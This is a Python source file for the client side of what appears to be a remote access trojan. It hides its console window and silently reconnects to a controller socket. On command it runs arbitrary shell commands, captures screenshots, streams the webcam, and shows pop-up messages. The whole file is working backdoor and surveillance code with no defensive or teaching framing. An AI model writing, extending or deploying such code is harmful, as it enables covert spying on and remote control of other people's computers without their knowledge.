import socket
import time
import json
import subprocess
import threading
import os
import sys

# Hide console window if running as a script on Windows
if os.name == 'nt':
    import ctypes
    ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)

try:
    import pyautogui
except ImportError:
    pyautogui = None
try:
    import cv2
except ImportError:
    cv2 = None

HOST = '127.0.0.1'
PORT = 65432
RECONNECT_DELAY = 5

def send_json(sock, data, binary_payload=None):
    msg = json.dumps(data).encode()
    sock.sendall(len(msg).to_bytes(4, 'big') + msg)
    if binary_payload:
        sock.sendall(len(binary_payload).to_bytes(8, 'big') + binary_payload)

def recv_json(sock):
    raw_len = recvall(sock, 4)
    if not raw_len:
        return None
    msg_len = int.from_bytes(raw_len, 'big')
    msg = recvall(sock, msg_len)
    return json.loads(msg.decode())

def recvall(sock, n):
    data = b''
    while len(data) < n:
        packet = sock.recv(n - len(data))
        if not packet:
            return None
        data += packet
    return data

def handle_command(sock, shell_cmd):
    try:
        result = subprocess.run(shell_cmd, shell=True, capture_output=True, text=True)
        output = result.stdout + result.stderr
    except Exception as e:
        output = f"Error: {e}"
    send_json(sock, {"type": "command_result", "output": output})

def handle_screenshot(sock):
    if pyautogui is None:
        send_json(sock, {"type": "screenshot_result", "error": "pyautogui not installed"})
        return
    try:
        img = pyautogui.screenshot()
        from io import BytesIO
        buf = BytesIO()
        img.save(buf, format='PNG')
        img_bytes = buf.getvalue()
        send_json(sock, {"type": "screenshot_result", "status": "ok"}, img_bytes)
    except Exception as e:
        send_json(sock, {"type": "screenshot_result", "error": str(e)})

def handle_video(sock):
    if cv2 is None:
        send_json(sock, {"type": "video_result", "error": "opencv-python not installed"})
        return
    cap = cv2.VideoCapture(0)
    send_json(sock, {"type": "video_result", "status": "start"})
    try:
        while True:
            ret, frame = cap.read()
            if not ret:
                break
            _, buf = cv2.imencode('.jpg', frame)
            frame_bytes = buf.tobytes()
            sock.sendall(len(frame_bytes).to_bytes(8, 'big') + frame_bytes)
            sock.settimeout(0.01)
            try:
                msg = recv_json(sock)
                if msg and msg.get("type") == "video_stop":
                    break
            except socket.timeout:
                continue
            except Exception:
                break
            finally:
                sock.settimeout(None)
    finally:
        cap.release()

def handle_chat(sock, message):
    vbs_code = f'MsgBox "{message}", 0, "Message from Host"'
    vbs_path = os.path.join(os.getenv('TEMP', '.'), 'popup.vbs')
    with open(vbs_path, 'w') as f:
        f.write(vbs_code)
    try:
        subprocess.Popen(['cscript', '//Nologo', vbs_path], shell=True)
        send_json(sock, {"type": "chat_result", "status": "shown"})
    except Exception as e:
        send_json(sock, {"type": "chat_result", "error": str(e)})
    finally:
        try:
            os.remove(vbs_path)
        except Exception:
            pass

def process_message(sock, msg):
    cmd_type = msg.get("type")
    if cmd_type == "command":
        handle_command(sock, msg.get("command", ""))
    elif cmd_type == "screenshot":
        handle_screenshot(sock)
    elif cmd_type == "video":
        handle_video(sock)
    elif cmd_type == "chat":
        handle_chat(sock, msg.get("message", ""))
    elif cmd_type == "forceexit":
        # Immediately terminate the slave process
        sys.exit(0)
    else:
        send_json(sock, {"type": "error", "error": "Unknown command"})
def main():
    while True:
        try:
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                s.connect((HOST, PORT))
                # No print statements for silent operation
                while True:
                    msg = recv_json(s)
                    if msg is None:
                        break
                    process_message(s, msg)
        except Exception:
            time.sleep(RECONNECT_DELAY)
            # No print statements for silent operation

if __name__ == "__main__":
    main()